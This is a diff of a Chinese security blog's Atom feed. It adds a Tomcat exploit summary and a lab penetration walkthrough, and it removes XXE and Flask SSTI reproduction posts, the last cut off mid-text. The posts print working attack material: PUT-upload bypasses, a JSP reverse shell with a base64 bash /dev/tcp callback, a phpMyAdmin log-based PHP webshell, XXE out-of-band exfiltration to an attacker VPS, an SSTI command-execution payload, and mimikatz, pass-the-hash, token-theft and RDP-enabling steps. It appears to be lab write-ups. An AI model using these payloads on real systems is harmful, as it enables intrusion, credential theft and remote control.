@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://www.yyxyy.xyz/</id>
     <title>Yyx</title>
-    <updated>2021-08-25T07:38:27.647Z</updated>
+    <updated>2021-08-30T02:13:56.728Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://www.yyxyy.xyz/"/>
     <link rel="self" href="https://www.yyxyy.xyz/atom.xml"/>
@@ -10,6 +10,197 @@
     <logo>https://www.yyxyy.xyz/images/avatar.png</logo>
     <icon>https://www.yyxyy.xyz/favicon.ico</icon>
     <rights>All rights reserved 2021, Yyx</rights>
+    <entry>
+        <title type="html"><![CDATA[tomcat漏洞总结]]></title>
+        <id>https://www.yyxyy.xyz/post/tomcat-lou-dong-zong-jie/</id>
+        <link href="https://www.yyxyy.xyz/post/tomcat-lou-dong-zong-jie/">
+        </link>
+        <updated>2021-08-30T02:12:40.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="0x01-cve-2017-12615">0x01 CVE-2017-12615</h1>
+<p>CVE-2017-12615对应的漏洞为任意文件写入，主要影响的是Tomcat的7.0.0-7.0.81这几个版本</p>
+<p>流程：</p>
+<p>抓包，修改为put请求就行。</p>
+<pre><code class="language-sql">PUT /test.txt HTTP/1.1
+
+testpoc
+</code></pre>
+<p>响应包为201表示成功</p>
+<p>同理可以上传冰蝎马这些东西</p>
+<p>上传这里可能会404，所以需要绕过</p>
+<pre><code class="language-powershell">1.Windows下不允许文件以空格结尾
+以PUT /test.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格
+
+2.Windows NTFS流
+Put/test.jsp::$DATA HTTP/1.1
+
+3./在文件名中是非法的，也会被去除（Linux/Windows）
+Put/test.jsp/ Http:/1.1
+
+</code></pre>
+<h1 id="0x02-cve-2020-1938">0x02 CVE-2020-1938</h1>
+<p>漏洞复现</p>
+<p>我复现了一下，感觉这个洞比较鸡肋</p>
+<p>首先寻找poc</p>
+<pre><code class="language-shell">git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
+cd CNVD-2020-10487-Tomcat-Ajp-lfi
+python CNVD-2020-10487-Tomcat-Ajp-lfi.py    #py2环境
+
+查看文件
+python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f /WEB-INF/web.xml
+
+反弹shell
+生成一个test.txt
+&lt;%
+    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}&quot;).getInputStream();
+    int a = -1;
+    byte[] b = new byte[2048];
+    out.print(&quot;&lt;pre&gt;&quot;);
+    while((a=in.read(b))!=-1){
+        out.println(new String(b));
+    }
+    out.print(&quot;&lt;/pre&gt;&quot;);
+%&gt;
+然后想办法把txt传入服务器。
+监听端口
+使用poc反弹shell
+python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.180.139 -p 8009 -f test.txt
+
+也可以使用msf，这里就不细说了，反正感觉有点鸡肋
+
+</code></pre>
+<h1 id="0x03-cve-2019-0232">0x03 CVE-2019-0232</h1>
+<p>2333</p>
+<h1 id="0x04-弱口令war包部署">0x04  弱口令＋war包部署</h1>
+<p>这个洞是tomcat最好用的</p>
+<h1 id="0x05-暴力破解">0x05 暴力破解</h1>
+<p>可以使用msf的模块 ：auxiliary/scanner/http/tomcat_mgr_login</p>
+<p>也可以使用burp抓包</p>
+<p>参考链接：https://xz.aliyun.com/t/10083#toc-10</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[靶场练习]]></title>
+        <id>https://www.yyxyy.xyz/post/ba-chang-lian-xi/</id>
+        <link href="https://www.yyxyy.xyz/post/ba-chang-lian-xi/">
+        </link>
+        <updated>2021-08-30T02:06:33.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="0x01-环境准备">0x01 环境准备</h1>
+<p>1.kali 外网服务器（攻击机） win10 外网攻击机</p>
+<p>2.win7(双网卡)  外网服务器  仅主机模式和nat模式</p>
+<p>3.win2003(内网)  nat模式  拟内网域成员主机</p>
+<p>4.win2008(内网)  nat模式 内网域控主机</p>
+<p>win7打开phpstudy</p>
+<h1 id="0x02-信息收集">0x02 信息收集</h1>
+<p>nmap收集：</p>
+<pre><code class="language-shell">PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45
+|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014 
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: GOD)
+1025/tcp open  msrpc        Microsoft Windows RPC
+1026/tcp open  msrpc        Microsoft Windows RPC
+1027/tcp open  msrpc        Microsoft Windows RPC
+1028/tcp open  msrpc        Microsoft Windows RPC
+1029/tcp open  msrpc        Microsoft Windows RPC
+3306/tcp open  mysql        MySQL (unauthorized)
+MAC Address: 00:0C:29:D6:F7:87 (VMware)
+Device type: general purpose
+Running: Microsoft Windows 7|2008|8.1
+OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
+Network Distance: 1 hop
+Service Info: Host: STU1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -5s, deviation: 0s, median: -5s
+|_nbstat: NetBIOS name: STU1, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:d6:f7:87 (VMware)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-08-29T03:31:32
+|_  start_date: 2021-08-29T02:47:18
+</code></pre>
+<p>发现80端口是个php探针</p>
+<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/1.png" alt="1630208790337" loading="lazy"></figure>
+<p>对其目录进行扫描，发现phpmyadmin。这里就可以考虑phpmyadmin的弱口令，进后台拿shell。<img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/2.png" alt="1630209693686" loading="lazy"></p>
+<h1 id="0x03-漏洞攻击">0x03 漏洞攻击</h1>
+<p>第一条线</p>
+<p>其实看见445端口开放，以及win7这个信息就想到了ms17010，（中间打蓝屏了几次哈哈哈）</p>
+<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/3.png" alt="1630209528653" loading="lazy"></figure>
+<p>设置payload</p>
+<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/4.png" alt="1630209775879" loading="lazy"></figure>
+<p>成了。</p>
+<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/5.png" alt="1630209795143" loading="lazy"></figure>
+<p>第二条线</p>
+<p>使用root/root弱口令进入后台。</p>
+<p>找到执行sql语句的点</p>
+<pre><code class="language-sql">set global general_log='on'   //开启日志
+set global general_log_file =&quot;C:/phpStudy/WWW/conf.php&quot;   //写马，php探针时已经获取绝对路径
+select &quot;&lt;?php eval($_POST['x'])?&gt;&quot;  //插入一句话
+
+</code></pre>
+<p>蚁剑连接</p>
+<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/6.png" alt="1630210442285" loading="lazy"></figure>
+<p>第三条线</p>
+<p>yxcms后台使用admin/123456登录，在前台模板哪里可以直接修改php</p>
+<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/7.png" alt="1630210795514" loading="lazy"></figure>
+<p>http://192.168.227.129/yxcms/protected/apps/default/view/default/目录下有修改的php</p>
+<p>使用哥斯拉连接</p>
+<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/8.png" alt="1630211663773" loading="lazy"></figure>
+<h1 id="0x04-内网信息收集">0x04 内网信息收集</h1>
+<p>首先用已经拿到的webshell上线cs</p>
+<p>使用ipconfig /all判断当前服务器所处的位置。这里看见这台服务器是双网卡，且存在域。</p>
+<p>也可以使用systeminfo 命令收集主机信息。查看安装的补丁，根据补丁可以判断使用哪些漏洞进行提权</p>
+<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/9.png" alt="1630245480556" loading="lazy"></figure>
+<p>可以使用tasklist，来查看是否安装的有杀软。</p>
+<p>这里使用CS提权</p>
+<figure data-type="image" tabindex="9"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/10.png" alt="1630244253114" loading="lazy"></figure>
+<p>一些信息收集的命令</p>
+<pre><code class="language-shell">ipconfig /all 查询一下本机的一些情况,IP段 网关 属于不属于域
+net view 查询一些存在联系的机器,一般以机器名显示,我们需要对其PING出IP,一是方便查询哪些重要机器的IP,二是方便查询存在几个段
+net view /domain 查询有几个域 因为大型网络里面一般不止一个域的
+net group /domain 查询域里面的组
+net user /domain 查询域用户
+net group “domain admins” /domain 查询域管理用户组
+</code></pre>
+<p>使用猕猴桃抓取密码，这里抓到了明文。</p>
+<p>在命令行开启3389端口（真实环境不建议开3389，除非本身开着的，高危行为）</p>
+<pre><code class="language-powershell">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+</code></pre>
+<p>使用获取的账号密码进行远程连接</p>
+<figure data-type="image" tabindex="10"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/11.png" alt="1630246747875" loading="lazy"></figure>
+<p>探测内网存活主机。</p>
+<pre><code class="language-powershell">for /l %i in (1,1,255) do @ping 192.168.64.%i -w 1 -n 1|find /i &quot;ttl=&quot;
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/12.png" alt="1630247142123" loading="lazy"></figure>
+<h1 id="0x05-横向渗透">0x05 横向渗透</h1>
+<p>这里利用psexec，因为192.168.52.0/24段不能直接连接。</p>
+<p>首先新建一个smb监听，然后利用cs的spwn派生会话，选择smb监听。</p>
+<p>然后进行hash传递攻击</p>
+<p>在视图--&gt;目标--&gt;选中前面扫描的所有目标--&gt;右键jump--&gt;psexec--&gt;选取凭证和监听器以及会话--&gt;运行</p>
+<figure data-type="image" tabindex="12"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/13.png" alt="1630249581022" loading="lazy"></figure>
+<p>token窃取</p>
+<p>除了前面使用获取的hash，也可以直接窃取token来登录其它服务器</p>
+<p>选择 <code>beacon</code> 右键 -&gt; 目标 -&gt; 进程列表</p>
+<p>选择 <code>GOD\Administrator</code> 的 <code>token</code> 盗取：</p>
+<figure data-type="image" tabindex="13"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/14.png" alt="1630250074750" loading="lazy"></figure>
+<p>然后勾选使用当前会话令牌</p>
+<figure data-type="image" tabindex="14"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/15.png" alt="1630250193248" loading="lazy"></figure>
+<p>效果差不多。</p>
+<p>也可以联动msf使用一些常见的漏洞进行扫描，批量打。比如ms_17010</p>
+<p>暂时先这样。</p>
+<p>参考连接：</p>
+<p>https://soapffz.com/sec/558.html</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[word宏免杀]]></title>
         <id>https://www.yyxyy.xyz/post/word-hong-mian-sha/</id>
@@ -521,240 +712,6 @@ nc -lvp 7777
 <p><a href="https://github.com/neex/phuip-fpizdam/issues/1">https://github.com/neex/phuip-fpizdam/issues/1</a></p>
 <p><a href="https://bugs.php.net/bug.php?id=78599">https://bugs.php.net/bug.php?id=78599</a></p>
 <p><a href="http://blog.leanote.com/post/snowming/9da184ef24bd">http://blog.leanote.com/post/snowming/9da184ef24bd</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[php_xxe]]></title>
-        <id>https://www.yyxyy.xyz/post/php_xxe/</id>
-        <link href="https://www.yyxyy.xyz/post/php_xxe/">
-        </link>
-        <updated>2021-06-06T03:55:47.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="php_xxe">php_xxe</h3>
-<h4 id="1漏洞复现">1.漏洞复现</h4>
-<h5 id="1环境安装">1）环境安装</h5>
-<p>使用vulhub里面的php_xxe</p>
-<h5 id="2-漏洞复现">2) 漏洞复现</h5>
-<p>漏洞介绍</p>
-<p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p>
-<p>在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题。</p>
-<p>漏洞利用</p>
-<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
-<p>payload:</p>
-<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/php_xxe/1.png" alt="" loading="lazy"></figure>
-<p>这个环境里面***dom.php、SimpleXMLElement.php 、simplexml_load_string.php***三个页面都存在这个漏洞。</p>
-<h5 id="3漏洞分析">3)漏洞分析</h5>
-<p>simplexml_load_string函数解析body，查看一下源码simplexml_load_string.php</p>
-<pre><code class="language-php">&lt;?php
-$data = file_get_contents('php://input');
-$xml = simplexml_load_string($data);
-
-echo $xml-&gt;name;
-
-</code></pre>
-<p>​	//先将xml发送给服务器解析，服务器解析完成后，就会按照我们的xml执行。当执行到**SYSTEM &quot;file:///etc/passwd&quot;**时，</p>
-<p>会引用服务器里面的/etc/passwd文件，当服务器解析完成后，会将/etc/passwd文件内容存入&amp;xxe中，然后将数据返回给恶意访问者。</p>
-<p>使用php伪协议</p>
-<p>除了使用前面的payload。我们发现源码有<strong>php://input</strong>,因此可以使用php伪协议读取源码。</p>
-<p>payload：</p>
-<pre><code class="language-xml">
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;
-]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/php_xxe/2.png" alt="" loading="lazy"></figure>
-<p>当没有回显的时候。</p>
-<p>就要想办法让服务器自己把数据往外带。</p>
-<p>我们可以写两个外部参数实体，第一个用来请求本地数据内容，第二个用 http 协议或者其他协议把请求到的数据作为参数带到我们的 vps，这样就实现了数据外带了。</p>
-<p>payload</p>
-<pre><code class="language-xml-dtd">
-&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE message [
-    &lt;!ENTITY % remote SYSTEM &quot;http://myvps/xml.dtd&quot;&gt;  
-    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/test.txt&quot;&gt;
-    %remote;
-    %send;
-]&gt;
-&lt;message&gt;1234&lt;/message&gt;
-</code></pre>
-<p>xml.dtd</p>
-<pre><code class="language-xml-dtd">
-
-&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://myvps:2333/?%file;'&gt;&quot;&gt;
-%start;
-</code></pre>
-<p>与此同时我们还需要在服务器上面打开2333端口</p>
-<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/php_xxe/3.png" alt="" loading="lazy"></figure>
-<p>后面还有dos攻击‘探测内网等等。。。</p>
-<p>参考链接</p>
-<p><a href="https://mp.weixin.qq.com/s/VWofHp5lJLYnbw01copnkw">https://mp.weixin.qq.com/s/VWofHp5lJLYnbw01copnkw</a></p>
-<p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[ssti漏洞复现]]></title>
-        <id>https://www.yyxyy.xyz/post/ssti-lou-dong-fu-xian/</id>
-        <link href="https://www.yyxyy.xyz/post/ssti-lou-dong-fu-xian/">
-        </link>
-        <updated>2021-06-06T03:54:53.000Z</updated>
-        <content type="html"><![CDATA[<h4 id="flask-ssti-漏洞复现">Flask ssti 漏洞复现</h4>
-<h6 id="环境">环境</h6>
-<p>使用vulhub里面的flask/ssti环境</p>
-<h6 id="查看源码发现漏洞处">查看源码，发现漏洞处</h6>
-<pre><code class="language-python">from flask import Flask, request
-from jinja2 import Template
-
-app = Flask(__name__)
-
-@app.route(&quot;/&quot;)
-def index():
-    name = request.args.get('name', 'guest')
-
-    t = Template(&quot;Hello &quot; + name)
-    return t.render()
-
-if __name__ == &quot;__main__&quot;:
-    app.run()
-    
-    
-// 很简单发现了name变量是我们能够控制的。
-</code></pre>
-<h6 id="漏洞成因分析">漏洞成因分析</h6>
-<p>首先输入正常值</p>
-<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/1.png" alt="" loading="lazy"></figure>
-<p>然后输入嵌套jinja2语法的语句</p>
-<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/2.png" alt="" loading="lazy"></figure>
-<p>很容易就发现了这一处漏洞</p>
-<h6 id="代码修复">代码修复</h6>
-<pre><code class="language-python">from flask import Flask, request
-from jinja2 import Template
-
-app = Flask(__name__)
-
-@app.route(&quot;/&quot;)
-def index():
-    name = request.args.get('name', 'guest')
-
-    t = Template(&quot;Hello &quot; + {{temp}})
-    return t.render(temp=&quot;name&quot;)
-
-if __name__ == &quot;__main__&quot;:
-    app.run()
-    
-//这样就能避免这个漏洞
-</code></pre>
-<h6 id="漏洞利用">漏洞利用</h6>
-<p>vulhub的POC</p>
-<pre><code class="language-jinja2">{% for c in [].__class__.__base__.__subclasses__() %}
-{% if c.__name__ == 'catch_warnings' %}
-  {% for b in c.__init__.__globals__.values() %}
-  {% if b.__class__ == {}.__class__ %}
-    {% if 'eval' in b.keys() %}
-      {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }}
-    {% endif %}
-  {% endif %}
-  {% endfor %}
-{% endif %}
-{% endfor %}
-</code></pre>
-<p>得到一下结果</p>
-<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/3.png" alt="" loading="lazy"></figure>
-<h6 id="python沙盒逃逸">python沙盒逃逸</h6>
-<p>vulhub的POC里面用的是一些python的魔术方法，因为在jinja2里面我们是可以访问python的一些对象和方法。</p>
-<p>Python的一些魔术方法</p>
-<pre><code class="language-python"># 1 __class__ : 返回当前对象所属的类
-&gt;&gt;&gt; ().__class__
-&lt;class 'tuple'&gt;
-&gt;&gt;&gt; [].__class__
-&lt;class 'list'&gt;
-
-#2 __base__&amp;&amp;__bases__ :作用都是返回当前类所继承的类，即基类，区别是base返回单个，bases以元组形式返回所有基类。
-&gt;&gt;&gt; class A():
-...     pass
-&gt;&gt;&gt; class B():
-...     pass
-&gt;&gt;&gt; class C(A,B):
-...     pass
-&gt;&gt;&gt; C.__base__
-&lt;class '__main__.A'&gt;
-&gt;&gt;&gt; C.__bases__
-(&lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;)
-
-#3 __mro__ :以元组的方式返回继承关系
-&gt;&gt;&gt; C.__mro__
-(&lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;, &lt;class 'object'&gt;)
-
-
-#4 __subclasses__():以列表的形式返回类的子类
-&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()
-[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'list'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'traceback'&gt;, &lt;class 'super'&gt;, &lt;class 'range'&gt;, &lt;class 'dict'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'str'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'property'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'tuple'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'reversed'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'code'&gt;, &lt;class 'frame'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'method'&gt;, &lt;class 'function'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'cell'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'iterator'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'BaseException'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib._installed_safely'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'classmethod'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'nt.ScandirIterator'&gt;, &lt;class 'nt.DirEntry'&gt;, &lt;class 'PyHKEY'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;]
-
-#5 __globals__ :以字典的形式返回函数所在模块命名空间的所有变量。
-#所有的函数都会有一个__globals__属性，可以通过globals获得大量内置函数，包括eval，exec等执行命令的1的函数
-
-#6 __builtin__&amp;&amp;__builtins__: python中直接能用的比如int(),list()等函数，可以直接在builtins里面查询到。（python3）
-&gt;&gt;&gt; import builtins
-&gt;&gt;&gt; dir(builtins)
-['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
-
-#python2：dir(__builtins__)
-'''
-__builtin__ 和 __builtins__之间是什么关系呢？
-1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。
-2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身
-'''
-
-
-
-#利用python特殊方法bypass沙盒
-
-
-## 构造继承链的思想
-
-#1.任意使用一个内置对象用class拿到他所对应的类
-#2.用bases拿到基类（&lt;class 'object'&gt;）
-#3.用subclasses()拿到子类列表
-#4.在字类里面寻找可以利用的类
-
-&gt;&gt;&gt; t = ().__class__.__bases__[0].__subclasses__()
-&gt;&gt;&gt; for c in t:
-...     if c.__name__== 'file':
-...             print t.index(c)
